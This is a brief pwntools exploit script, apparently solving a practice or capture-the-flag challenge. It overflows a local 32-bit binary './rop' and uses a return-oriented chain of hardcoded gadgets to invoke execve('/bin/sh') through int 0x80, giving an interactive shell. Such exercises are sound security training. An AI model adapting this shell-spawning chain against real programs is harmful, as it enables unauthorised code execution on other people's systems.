from pwn import *

p = process("./rop")
# p = gdb.debug("./rop")

pop_eax_ret = 0x80bb196
pop_edx_ecx_ebx_ret = 0x806eb90
offset = 0xffffcdb8 - ( 0xffffcd30 + 0x1c ) + 4
bin_sh = 0x080be408
int_0x80 = 0x08049421

pause()
p.sendline(
    cyclic(offset) + p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(bin_sh) + p32(int_0x80)
)
p.interactive()
